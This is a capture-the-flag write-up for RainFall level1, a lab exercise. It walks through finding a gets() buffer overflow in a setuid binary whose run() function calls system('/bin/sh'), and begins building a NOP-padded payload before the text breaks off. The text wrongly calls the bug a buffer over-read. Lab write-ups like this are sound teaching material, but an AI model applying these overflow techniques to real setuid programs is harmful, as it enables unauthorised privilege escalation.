level1
======

*	We spawn with a [level1](source/level1) executable
	```console
	level1@RainFall:~$ ls -l
	total 732
	level1@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
	level1@RainFall:~$ ./level1
	█
	level1@RainFall:~$ ./level1 test
	█
	```
*	So we get an endless loop here, let's do as usual
	```console
	root@DESKTOP-69N2SL4:~# scp -P 4242 level1@192.168.29.4:~/level1 .
	root@DESKTOP-69N2SL4:~# ./getFunctions.sh
	```
*	When we take a look at the main it looks like I was wrong, the code use the function `gets()` which led me to think that the program is reading the input (My mistake here, I should've at least tried to add something)
*	We also have another function called `run()`, this one uses `fwrite()`.
*	Looking deeper into gdb, we can see that it takes $eax=`("Good... Wait what?\n")` and then it calls `system()` to execute `/bin/sh`
*	So, now we are dealing with a [Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/)
*	Here we can see the buffer is sized `80` bytes
	```assembly
	sub    $0x50,%esp
	```
	This time the buffer isn't quite big but still I wont write char one by one so we will use python like this : `$(python -c "print('x') * y")`
*	Since this program is more of a buffer *over-READ* issue, we need to put our exploit in a file instead of doing it on the terminal directly
	```console
	level1@RainFall:~$ python -c 'print "\x90" * 80' > /tmp/exploit
	level1@RainFall:~$ gdb ./level1
	```